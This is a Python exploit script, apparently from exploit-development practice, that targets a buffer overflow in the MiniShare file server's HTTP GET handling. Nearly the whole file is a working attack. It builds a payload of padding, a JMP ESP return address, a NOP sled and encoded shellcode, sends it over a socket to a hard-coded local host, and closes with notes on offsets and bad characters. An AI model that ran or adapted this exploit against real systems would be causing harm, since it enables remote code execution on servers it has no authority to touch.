#! /usr/bin/python3

import socket

# MINISHARE Buffer Overflow Exploit - FTP & HTTP File Share Server

# Buffer Overflow for file name exploit in HTTP header section
# Can be exploited using many HTTP methods
# This is for GET method.


# Exploit Structure
# "GET " + buffer_input + " HTTP/1.1\r\n\r\n"

junk_data = bytearray(b"A" * 1787)
return_address = bytearray(b'\x53\x93\x42\x7e')
num_nop_bytes = 100
nop_sled = bytearray(b"\x90" * num_nop_bytes)

shellcode = (
    b"\xdb\xc4\xd9\x74\x24\xf4\x5b\xbd\xc6\xf6\x92\x87\x33\xc9\xb1"
    b"\x53\x31\x6b\x17\x83\xeb\xfc\x03\xad\xe5\x70\x72\xcd\xe2\xf7"
    b"\x7d\x2d\xf3\x97\xf4\xc8\xc2\x97\x63\x99\x75\x28\xe7\xcf\x79"
    b"\xc3\xa5\xfb\x0a\xa1\x61\x0c\xba\x0c\x54\x23\x3b\x3c\xa4\x22"
    b"\xbf\x3f\xf9\x84\xfe\x8f\x0c\xc5\xc7\xf2\xfd\x97\x90\x79\x53"
    b"\x07\x94\x34\x68\xac\xe6\xd9\xe8\x51\xbe\xd8\xd9\xc4\xb4\x82"
    b"\xf9\xe7\x19\xbf\xb3\xff\x7e\xfa\x0a\x74\xb4\x70\x8d\x5c\x84"
    b"\x79\x22\xa1\x28\x88\x3a\xe6\x8f\x73\x49\x1e\xec\x0e\x4a\xe5"
    b"\x8e\xd4\xdf\xfd\x29\x9e\x78\xd9\xc8\x73\x1e\xaa\xc7\x38\x54"
    b"\xf4\xcb\xbf\xb9\x8f\xf0\x34\x3c\x5f\x71\x0e\x1b\x7b\xd9\xd4"
    b"\x02\xda\x87\xbb\x3b\x3c\x68\x63\x9e\x37\x85\x70\x93\x1a\xc2"
    b"\xb5\x9e\xa4\x12\xd2\xa9\xd7\x20\x7d\x02\x7f\x09\xf6\x8c\x78"
    b"\x6e\x2d\x68\x16\x91\xce\x89\x3f\x56\x9a\xd9\x57\x7f\xa3\xb1"
    b"\xa7\x80\x76\x2f\xaf\x27\x29\x52\x52\x97\x99\xd2\xfc\x70\xf0"
    b"\xdc\x23\x60\xfb\x36\x4c\x09\x06\xb9\x63\x96\x8f\x5f\xe9\x36"
    b"\xc6\xc8\x85\xf4\x3d\xc1\x32\x06\x14\x79\xd4\x4f\x7e\xbe\xdb"
    b"\x4f\x54\xe8\x4b\xc4\xbb\x2c\x6a\xdb\x91\x04\xfb\x4c\x6f\xc5"
    b"\x4e\xec\x70\xcc\x38\x8d\xe3\x8b\xb8\xd8\x1f\x04\xef\x8d\xee"
    b"\x5d\x65\x20\x48\xf4\x9b\xb9\x0c\x3f\x1f\x66\xed\xbe\x9e\xeb"
    b"\x49\xe5\xb0\x35\x51\xa1\xe4\xe9\x04\x7f\x52\x4c\xff\x31\x0c"
    b"\x06\xac\x9b\xd8\xdf\x9e\x1b\x9e\xdf\xca\xed\x7e\x51\xa3\xab"
    b"\x81\x5e\x23\x3c\xfa\x82\xd3\xc3\xd1\x06\xe3\x89\x7b\x2e\x6c"
    b"\x54\xee\x72\xf1\x67\xc5\xb1\x0c\xe4\xef\x49\xeb\xf4\x9a\x4c"
    b"\xb7\xb2\x77\x3d\xa8\x56\x77\x92\xc9\x72"
)

buffer = junk_data + return_address + nop_sled + shellcode

host = "192.168.1.20"
http_port = 80


def sendExploit(buffer, host, port):
    csocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    csocket.connect((host, port))

    prefix = bytearray("GET ".encode("ascii"))
    suffix = bytearray(" HTTP/1.1\r\n\r\n".encode("ascii"))

    data = prefix + buffer + suffix

    csocket.send(data)

    print(f"[+] Data sent to {host}:{str(port)}")

    csocket.close()


sendExploit(buffer, host, http_port)


# EIP at crash: 36684335
# ESP at crash: ESP -> 013B3908 -> 43376843

# EIP Offset: 1787
# ESP Offset: 1791

# ESP is pointing to input buffer.
# Can use `JMP ESP` instruction to jump to shellcode

# `JMP ESP` Address is user32.dll -> 7E429353

# Bad Characters:
# 0x00, 0x0D

# Terminator Used: 0x0a